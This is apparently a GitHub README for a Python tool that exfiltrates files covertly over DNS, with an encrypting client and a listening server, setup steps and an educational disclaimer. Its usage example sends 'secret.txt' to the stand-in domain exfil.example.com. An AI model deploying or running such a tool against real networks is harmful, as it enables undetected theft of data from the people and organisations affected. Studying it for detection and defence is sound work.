# 🧬 Python DNS Exfiltration Client & Server

This project demonstrates how data can be exfiltrated over DNS using a Python-based client-server architecture. The client reads a file, encrypts and encodes its contents, and transmits the data via DNS queries. The server listens for these queries, decodes and decrypts the data, and reconstructs the original file.

> ⚠️ **Disclaimer**: This tool is intended for educational and research purposes only. Unauthorized use against systems without explicit permission is illegal and unethical.

---

## 📂 Project Structure

- `client.py`: Encrypts and encodes the file, then sends data chunks via DNS queries.
- `server.py`: Listens for incoming DNS queries, decodes and decrypts the data, and reconstructs the original file.
- `.env`: Stores the AES encryption key used by both client and server.
- `requirements.txt`: Lists the Python dependencies required for the project.
- `LICENSE`: GPL-3.0 License.

---

## 🔐 Encryption

- Uses **AES-GCM (256-bit)** encryption for confidentiality and integrity.
- Each session uses a random 12-byte nonce.
- Ciphertext is Base32-encoded (unpadded) for DNS-safe transmission.

### Environment Variable

Create a `.env` file in the root directory with the following:

```env
EXFIL_KEY=<your 64-character hex key>
```

You can generate a 256-bit key with:

```bash
head -c 32 /dev/urandom | xxd -p -c 32
```

> ⚠️ The same key must be used on both the client and the server for successful decryption.

---

## ⚙️ Features

### Client (`client.py`)

- Encrypts file contents using AES-GCM.
- Base32-encodes the encrypted data.
- Splits encoded data into DNS-safe chunks.
- Sends chunks via DNS A queries using `dnslib`.
- Uses a unique session identifier per file.

### Server (`server.py`)

- Listens on UDP port 5300 for DNS queries.
- Extracts and reassembles chunks by session ID.
- Base32-decodes the payload.
- Decrypts using AES-GCM.
- Saves the original file to disk.

---

## 🛠️ Installation

1. **Clone the Repository**

   ```bash
   git clone https://github.com/bufo333/python-dns-exfiltration-client-server.git
   cd python-dns-exfiltration-client-server
   ```

2. **Install Dependencies**

   It's recommended to use a virtual environment:

   ```bash
   python3 -m venv venv
   source venv/bin/activate
   pip install -r requirements.txt
   ```

3. **Create `.env` file with encryption key**

   ```bash
   echo "EXFIL_KEY=$(head -c 32 /dev/urandom | xxd -p -c 32)" > .env
   ```

---

## 🚀 Usage

### Start the Server

```bash
python3 server.py
```

- The server will start listening on UDP port 5300.
- Decrypted files are written to the `output/` directory.

### Run the Client

```bash
python3 client.py <file_path> <domain>
```

- `<file_path>`: Path to the file you want to exfiltrate.
- `<domain>`: The domain name to which the DNS queries will be sent.

**Example:**

```bash
python3 client.py secret.txt exfil.example.com
```

---

## 📌 Notes

- Ensure that the domain (`exfil.example.com`) is configured to point to the server's IP address.
- The server must have permissions to bind to the specified UDP port.
- This tool is for educational purposes. Always obtain authorization before using on any network.

---

## 📄 License

This project is licensed under the GNU General Public License v3.0. See the [LICENSE](LICENSE) file for details.

---

## 🤝 Acknowledgments

Inspired by various DNS exfiltration techniques and tools in the cybersecurity and red-team communities.

---

## 🧠 Learn More

For deeper insights into DNS-based data exfiltration:

- [DNS Exfiltration Techniques](https://attack.mitre.org/techniques/T1048/)
- [How DNS Tunneling Works – Detection & Response](https://www.socinvestigation.com/how-dns-tunneling-works-detection-response/)
- [DNS Exfiltration & Tunneling: How it Works](https://helgeklein.com/blog/dns-exfiltration-tunneling-how-it-works-dnsteal-demo-setup/)

---

*Happy Learning! Stay Ethical and Informed.*
